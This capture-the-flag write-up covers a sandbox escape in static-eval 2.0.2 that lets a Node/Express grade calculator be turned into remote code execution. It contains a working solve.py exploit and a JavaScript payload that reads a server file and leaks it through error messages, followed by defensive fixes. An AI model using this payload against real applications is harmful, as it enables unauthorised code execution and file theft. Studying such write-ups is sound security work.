## Overview

**Baby Breaking Grad** is an Easy Web challenge. A small Node/Express grade
calculator lets you POST a `formula` that the server evaluates with the
[static-eval](https://www.npmjs.com/package/static-eval) library — an
"AST evaluator" the developers trusted as a sandbox. It isn't one:
static-eval `2.0.2` hands regenerated function source to the real
`Function()` constructor, so a carefully shaped formula breaks out into
arbitrary server-side JavaScript — a [code injection](https://cwe.mitre.org/data/definitions/95.html)
that gives full RCE and reads the flag.

## The technique

The endpoint that matters is `POST /api/calculate`, which evaluates the
attacker-controlled `formula`:

```js
// helpers/StudentHelper.js
const evaluate = require('static-eval');   // 2.0.2  <-- vulnerable
const parse = require('esprima').parse;

hasPassed({ exam, paper, assignment }, formula) {
    let ast = parse(formula).body[0].expression;
    let weight = evaluate(ast, { exam, paper, assignment });
    return parseFloat(weight) >= parseFloat(10.5);
}
```

static-eval walks the esprima AST node-by-node and refuses dangerous nodes.
A `MemberExpression` whose object is a function returns an internal `FAIL`
sentinel, so the usual `x.constructor.constructor('return process')()` chain
is blocked. **But** its `FunctionExpression` branch ends with:

```js
return Function(keys.join(', '), 'return ' + unparse(node)).apply(null, vals);
```

It regenerates the function source with `escodegen` and runs it through the
**real `Function()` constructor** — completely unsandboxed. The only guard is
that each statement in the function body is walked under the sandbox first, and
the whole thing bails if any walk returns `FAIL`.

The bypass is to make the body *survive* that walk while still smuggling live
code through. A `TemplateLiteral` does exactly that: its branch concatenates
`walk(expr)` with `+=` and **never checks for `FAIL`**, so a body like
`` `${eval("...")}` `` walks to a harmless string, passes the body check, and
then escodegen regenerates the real `eval()` which executes with no sandbox at
all. The reliable Node RCE gadget is
`global.process.mainModule.require('child_process')`, which reaches
`child_process` even when `require` isn't a free variable in scope.

## Solution

The flag file is renamed to `/app/flag<random5>` on container start, the route
only ever answers `pass`/`nope` (no command output is reflected), and the
web-served `/app/static` directory is **not writable** by the `nobody` user.
The clean read channel: make the payload `throw` the flag contents as an
`Error` — Express's default error handler reflects `Error.message` in the
**500 response body**, so the flag can be grepped straight out of the error HTML.

`solve.py`:

```python
#!/usr/bin/env python3
# Baby Breaking Grad — static-eval 2.0.2 sandbox escape -> RCE
import sys, json, re, html, urllib.request

T = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1:1337"
BASE = "http://%s" % T

def run_js(js):
    # js runs inside eval("..."); the IIFE FunctionExpression is regenerated by
    # escodegen and executed through the real Function() constructor. The
    # `${eval(...)}` TemplateLiteral swallows static-eval's FAIL sentinel so the
    # body survives the sandbox walk.
    formula = '(function(x){return `${eval("%s")}`})()' % js.replace('"', '\\"')
    data = json.dumps({"name": "x", "exam": 1, "paper": 1, "assignment": 1,
                       "formula": formula}).encode()
    req = urllib.request.Request(BASE + "/api/calculate", data=data,
                                 headers={"Content-Type": "application/json"})
    try:
        return 200, urllib.request.urlopen(req, timeout=20).read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()

# Node payload: find /app/flag*, read it, throw it as an Error so Express
# reflects the contents in the 500 body.
PAYLOAD = (
    "var fs=global.process.mainModule.require('fs');"
    "var f=fs.readdirSync('/app').filter(function(n){return n.indexOf('flag')==0;});"
    "throw new Error('FLAG '+fs.readFileSync('/app/'+f[0]).toString());"
)

code, body = run_js(PAYLOAD)
m = re.search(r"Error:\s*FLAG\s*(HTB\{[^<]+\})", body)
print("[*] FLAG:", html.unescape(m.group(1)).strip() if m else ("no flag, code %s" % code))
```

Running it against the instance returns the flag:

```bash
python3 solve.py <target-host>:<port>
# [*] FLAG: HTB{...}
```

## Why it worked

The developers reached for an AST-evaluator library believing it sandboxed the
user formula. static-eval `2.0.2`'s own `FunctionExpression` handler defeats
that — it regenerates the source and runs it through the real `Function()`
constructor — and the `TemplateLiteral` branch never checks the `FAIL`
sentinel, so a malicious body slips past the sandbox walk untouched. An
"evaluator that only does arithmetic" was actually an unauthenticated RCE
([CWE-95: eval injection](https://cwe.mitre.org/data/definitions/95.html)).

## Fix / defense

- Don't evaluate user formulas at all — use a real arithmetic parser
  (`mathjs.evaluate()` with a restricted scope, or `expr-eval`) over named
  numeric variables, or an explicit `^[-+*/().0-9A-Za-z_\s]+$` allow-list.
- Treat any AST-sandbox library as escapable; never rely on it as a security
  boundary, and upgrade past static-eval `2.0.2`.
- Set `NODE_ENV=production` with a custom error handler so stack traces and
  `Error.message` never reach the client — that 500 leak was the entire read
  channel.
- Run the Node process as a low-privilege user that cannot read the flag.
